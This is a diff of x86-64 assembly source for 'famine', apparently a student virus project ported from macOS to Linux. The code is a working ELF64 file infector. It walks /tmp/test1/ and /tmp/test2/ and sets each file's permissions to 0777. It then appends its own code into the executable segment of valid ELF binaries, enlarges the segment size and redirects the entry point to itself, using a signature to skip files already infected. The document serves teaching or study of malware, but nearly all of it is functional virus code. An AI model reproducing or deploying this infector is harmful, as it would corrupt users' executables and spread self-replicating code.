@@ -1,39 +1,26 @@
-%include "famine_macos.inc"
+; famine elf64 - size 730 bytes
 
-BUF_SIZE    equ 1024
-LOCAL_VARS  equ 1024
+%include "famine.inc"
 
 bits 64
 default rel
 global _start
 section .text
 
-strlen:         xor         rax, rax
-.loop:          cmp         byte [rax + rdi], 0
-                jz          .done
-                inc         rax
-                jmp         .loop
-.done:          ret
-
-
-puts:           call        strlen
-                mov         rdx, rax
-                mov         rsi, rdi
-                mov         rdi, 1
+_host:
+                mov         rdx, 13
+                mov         rax, 1
+                mov         rdi, rax
+                lea         rsi, [rel hello]
+               
                 mov         rax, __NR_write
                 syscall
-                ret
-
-_host:          lea         rdi, [rel hello]
-                call        puts
 
                 xor         rdi, rdi
                 mov         rax, __NR_exit
                 syscall
+
 hello           db          "hello world",33,10,0
-                times 128 - $ + strlen db 0x90
-
-
 
 _start:
                 push        rdi
@@ -48,75 +35,95 @@ _start:
                 push        rax
 
                 lea         rdi, [rel slash_tmp]
+.opendir:
+                mov         r14, rdi
                 mov         rsi, O_RDONLY | O_DIRECTORY
                 mov         rax, __NR_open
                 syscall
-                test        rax, rax
-                jl          _return
+                test        eax, eax
+                jl          .nextdir                
 
                 mov         [rsp-0x30], rax                     ;rsp-0x30 = directory_fd
 
-                mov         rdi, rax
-                mov         rax, __NR_fchdir
-                syscall
-                test        rax, rax
-                jl          _return
-
-
-scandir:        xor         r10, r10
+.readdir:
                 mov         rdx, BUF_SIZE
                 lea         rsi, [rsp - (BUF_SIZE + LOCAL_VARS)]
-                mov         rdi, [rsp-0x30]             ;directory fd
-                mov         rax, __NR_getdents64
+                mov         rdi, [rsp-0x30]                     ;directory fd
+                mov         rax, __NR_getdents
                 syscall
                 test        rax, rax
-                jle         .close
+                jle         .closedir
 
-                mov         [rsp-0x38], rax                     ; nread from getdents64
-                xor         rdx, rdx
-                mov         [rsp-0x40], rdx                     ;rsp-0x40 = getdents_idx
-
+                xor         r13, r13
+                mov         r12, rax
 .file:
-
                 lea         rdi, [rsp - (BUF_SIZE + LOCAL_VARS)]
-                add         rdi, [rsp-0x40]
+                add         rdi, r13
 
-                cmp         byte [rdi + 18], DT_REG
-                jne         .next
+                xor         edx, edx
 
-                add         rdi, 19                             ; d_name[]
+                mov         dx, word [rdi + 0x10]               ; linux d_reclen
+                dec         edx
+                mov         al, byte [rdi + rdx]                ; linux d_type
+                inc         edx
+                add         rdi, 18                             ; linux d_name
+.increment_idx:
+                add         r13, rdx
+
+                cmp         al, DT_REG
+                jne         .nextfile
+
                 call        process
-
-.next:
-
-                lea         rdi, [rsp - (BUF_SIZE + LOCAL_VARS)]
-                add         rdi, [rsp-0x40]
-                movzx       rax, word [rdi + 16]                ; d_reclen
-                add         rax, [rsp-0x40]
-                mov         [rsp-0x40], rax
-                mov         rdx, [rsp-0x38]                     ; compare getdents64 idx vs nread
-                cmp         rax, rdx                            ;
+.nextfile:
+                cmp         r13, r12
                 jl          .file
-                jmp         scandir
+                jmp         .readdir
 
-.close:         mov         rdi, [rsp-0x30]
+.closedir:      mov         rdi, [rsp-0x30]
                 mov         rax, __NR_close
                 syscall
-_return:
-                pop         rax
+.nextdir:
+                xor         ecx, ecx
+                mul         ecx
+                dec         ecx
+                mov         rdi, r14
+                repnz       scasb
+                cmp         byte [rdi], 0
+                jnz         .opendir
 
+                pop         rax
                 pop         rdx
                 pop         rcx
                 pop         rsi
                 pop         rdi
 
                 jmp         rax
+process:                                                        ; expecting filename in rdi
+                                                                ; directory in r14
+                mov         rsi, r14
+                mov         rax, rdi
+                lea         rdi, [rsp - ((BUF_SIZE * 2) + LOCAL_VARS)]
+                mov         rdx, rdi                            ; concat directory and filename
 
-process:                                                         ; expecting filename in rdi
+.dirname:       movsb
+                cmp         byte [rsi], 0
+                jnz         .dirname
+                mov         rsi, rax
+.filename:      movsb
+                cmp         byte [rsi - 1], 0
+                jnz         .filename
+                mov         rdi, rdx
+
+                push        rdi
+                mov         rsi, 0o777
+                mov         rax, __NR_chmod                     ; try to set permissions
+                syscall
+                pop         rdi
+
                 mov         rsi, O_RDWR
                 mov         rax, __NR_open
                 syscall
-                test        rax, rax
+                test        eax, eax
                 jl          .return
 
                 mov         [rsp-0x48], rax                     ; rsp-0x48 = infect_fd
@@ -128,8 +135,10 @@ process:                                                         ; expecting fil
                 cmp         rax, 0
                 jnz         .close
 
-                mov         rax, qword [rsp - (0x148-0x30)]     ; st_size
+                mov         rax, qword [rsp - (0x148-0x30)]     ; linux st_size
                 mov         [rsp-0x50], rax                     ; rsp-0x50 = infect_fsize
+                cmp         rax, 0x1000                         ; file too small
+                jl          .close
 
                 xor         r9, r9
                 mov         r8, [rsp-0x48]
@@ -144,12 +153,12 @@ process:                                                         ; expecting fil
 
                 mov         [rsp-0x58], rax                     ;rsp-0x58 = infect_mem
                 mov         rdi, rax
+
                 call        is_valid_elf64
-                cmp         rax, 1
-                jnz         .unmap
+                test        al, al
+                jz          .unmap
 
-                call        insert
-
+                call        insert_elf64
 
 .unmap:         mov         rsi, [rsp-0x50]                     ; infect_fsize
                 mov         rdi, [rsp-0x58]                     ; infect_mem
@@ -180,7 +189,7 @@ is_valid_elf64:                                                 ; expecing data 
 .ok:            inc         rax
 .return:        ret
 
-insert:                                                         ; expecting data in rdi
+insert_elf64:                                                   ; expecting data in rdi
                 push        r13
                 push        r14
                 push        r15
@@ -189,8 +198,8 @@ insert:                                                         ; expecting data
 
                 mov         rdx, qword [r15 + 0x18]             ; entry point
                 mov         rax, qword [rdi + 0x20]             ; e_phoff
+                movzx       rcx, word [rdi + 0x38]              ; e_phnum                
                 add         rdi, rax                            ; rdi = *Elf64_Phdr
-                movzx       rcx, word [rdi + 0x38]              ; e_phnum
 .segment:       cmp         rcx, 0
                 jle         .return
                 mov         rax, 0x0000000500000001             ; p_flags = PF_X | PF_R, p_type = PT_LOAD
@@ -209,7 +218,7 @@ insert:                                                         ; expecting data
 
                 mov         r14, rdi                            ; code segment Elf64_Phdr*
 
-                lea         rdi, [r15 + rax]                     ; data + p_offset + p_filesz
+                lea         rdi, [r15 + rax]                    ; data + p_offset + p_filesz
                 mov         rsi, rdi                            ; save: end of segment
                 xor         al, al
                 mov         rcx, _finish - _start
@@ -224,14 +233,13 @@ insert:                                                         ; expecting data
                 jz          .return                             ; already infected
                 mov         rcx, _finish - _start
                 repnz       movsb
-
-                ;r15 = beginning of file
-                ;r14 = code segment header
-                ;r13 = new entry point
-
+                                                                ;r15 = beginning of file
+                                                                ;r14 = code segment header
+                                                                ;r13 = new entry point
                 mov         rax, qword [r15 + 0x18]             ; entry point
-                mov         [rdi - 0x08], rax                   ; _finish - 8 = entry
-                mov         [rdi - 0x10], r13                   ; _finish - 16 = pie_address
+                mov         qword [rdi - 8], rax                ; _finish - 8 = entry
+                mov         qword [rdi - 16], r13               ; _finish - 16 = pie_address
+                mov         byte [rdi - 17], 0
                 mov         qword [r15 + 0x18], r13             ; fix entry point
                 mov         rax, _finish - _start
                 add         qword [r14 + 0x20], rax             ; increase p_filesz
@@ -248,14 +256,9 @@ insert:                                                         ; expecting data
                 pop         r13
                 ret
 
-%ifidn __OUTPUT_FORMAT__, elf64
-    platform    db 0
-%elifidn __OUTPUT_FORMAT__, macho64
-    platform    db 1
-%endif
+slash_tmp       db          "/tmp/test1/",0,"/tmp/test2/",0,0
+signature       db          "famine! elf64 @42siliconvalley",0
 
-slash_tmp   db "/tmp",0
-signature   db "famine v0.1 @42siliconvalley",0
-pie_address dq _start
-entry       dq _host
-_finish     equ $
+pie_address     dq          (_start - _host)
+entry           dq          0
+_finish:
